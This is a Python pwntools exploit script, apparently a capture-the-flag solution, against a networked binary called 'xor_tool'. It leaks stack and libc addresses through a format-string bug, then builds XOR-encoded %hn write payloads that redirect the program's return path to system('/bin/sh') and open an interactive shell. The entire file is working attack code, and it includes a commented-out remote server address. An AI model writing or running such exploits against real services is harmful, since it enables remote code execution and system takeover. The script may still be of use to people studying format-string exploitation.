#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
elf=ELF('xor_tool')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
offset_printf=libc.sym['printf']
offset_system=libc.sym['system']
offset_binsh=libc.data.index("/bin/sh\x00")

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,decal):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)+decal
    finnom='A'*((8-decal-(lg % 4)) % 4)
#    finnom='A'*((16-decal-(lg % 8)) % 8)
    lg=lg+len(finnom)
    indice=offset+(lg/4)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print len(nom),":",nom
    return(nom)

def lchaineverif(lwhat,offset,decal,vv="8x"):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)+decal
    finnom='A'*((8-decal-(lg % 4)) % 4)
#    finnom='A'*((16-decal-(lg % 8)) % 8)
    lg=lg+len(finnom)
    indice=offset+(lg/4)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def chaine(what,offset,decal):
    nom0=""
    nom3=""
    w1=what & 0xffff
    w2 = what >> 16
    if (w1 <= w2):
        nom1=fmt(w1)+"%"
        o1=0
        nom2=fmt(w2-w1)+"%"
        o2=0
        # nom1 offset1 hn offset2 nom2 hn nom4 adr1 adr2
    hn="$hn"
    lg=len(nom1)+len(nom2)+len(hn)+len(hn)+decal
    lg=lg+2*len(str(baseN(offset,10,2)))
    nom4='A'*((8-(lg % 8)) % 8)
    lg=lg+len(nom4)
    indice=offset+(lg/4)
    nom =nom1+str(baseN(indice+o1,10,2))+hn+nom2+str(baseN(indice+o2,10,2))+hn+nom4
    print nom
    return(nom)


def sendchaine(s):
    clef=chr(0x99)
    p.recvuntil(":")
    p.sendline("2") 
    p.recvuntil(":")
    p.sendline(clef)
    p.recvuntil(":")
    sp=""
    for c in s:
        sp=sp+chr(ord(c)^ord(clef))
    print "->",sp
    p.send(sp+"\n")
    time.sleep(TIME)
    s=p.recv(1024)
#    print s
#    print s[s.index(":")+1:]
    return(s)

def sendchaineshort(s):
    clef=chr(0x00)
    p.recvuntil(":")
    p.sendline(clef)
    p.recvuntil(":")
    sp=""
    for c in s:
        sp=sp+chr(ord(c)^ord(clef))
    print "->",sp
    p.send(sp+"\n")
    time.sleep(TIME)
    s=p.recv(1024)
#    print s
#    print s[s.index(":")+1:]
    return(s)



def lireoffset(i):
    p.recvuntil(":")
    p.sendline("2") 
    p.recvuntil(":")
    p.sendline("\x00")
    p.recvuntil(":")
    p.send("%"+str(i)+"$08x"+"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKK\n")
    s=p.recvuntil("\n")
#    print s
#    print s[s.index(":")+1:]
    s=s[s.index(":")+1:]
    return(int(s[:8],16))

def lirestroffset(i):
    global p
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline("\x00")
    p.recvuntil(":")
    p.send("%"+str(i)+"$s"+"\n")
    time.sleep(TIME)
    s=p.recv(1024)
    s=s[s.index("msg :")+5:]
    if (s[0:len("Segmentation fault")]=="Segmentation fault"):
        p.close()
        p=remote(host,port)
    return(s)


def getzone(a):
#    p.sendline("%8$s"+"@@@@"+p32(a))
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil("key to decrypt:")
    p.sendline("\x00")
    p.recvuntil("decrypt:")
    p.send("AA"+"%13$s@@@"+p32(a)+"@@@@\n")
    time.sleep(TIME)
    s=p.recvuntil("@@@@\n")
    print s
    s=s[s.index("msg :AA")+7:]
    fin=s.index("@@@")
    return(s[:fin])

def tomem(i):
    return(BASEPILE+4*i)


host="localhost"
port=1234
#host="139.59.61.220"
TIME=0.02
#port=32345
p=remote(host,port)
'''
# dump de la pile
for i in range(1,100):
    r=lireoffset(i)
    c=""
    for j in range(4):
        c=c+toprint(chr(((r>>(8*j)) & 0xff)))
    print i," -> ",baseN(r,16,8)," : ",c
'''
# retour de decrypt = offset 27
# donc EBP = offset 26
# pile:

BASEPILE=lireoffset(26)-4*34

# adresses libc

printf_libc=word(liremem(elf.got["printf"],4))
print "libc_printf=",hex(printf_libc)
system=printf_libc-offset_printf+offset_system
binsh=printf_libc-offset_printf+offset_binsh
print "system=",hex(system),", /bin/sh=",hex(binsh)
print "verification:",liremem(binsh,8)

# principe: on remplace la sortie de decrypt par une pile de la forme
# <libc_system><dummy><chaine /bin/sh>
# il faut faire une boucle donc en remplace le retour de call decrypt
# en le faisant boucler sur lui même
# pour boucler, il faut écrire 0x8902 en offset 27
# une longuer de 50 est limite

print "Pile offset 27:",hex(tomem(27))
ch=lchaine([binsh & 0xffff,0x8902],10,2)+p32(tomem(29))+p32(tomem(27))
print ch
sendchaine(ch)

ch=lchaine([binsh >> 16,0x8902],10,2)+p32(tomem(29)+2)+p32(tomem(27))
dump(0,sendchaineshort(ch))

ch=lchaine([system],10,2)+p32(tomem(27))+p32(tomem(27)+2)
dump(0,sendchaineshort(ch))
p.recvuntil("\n")
p.interactive()
exit(0)
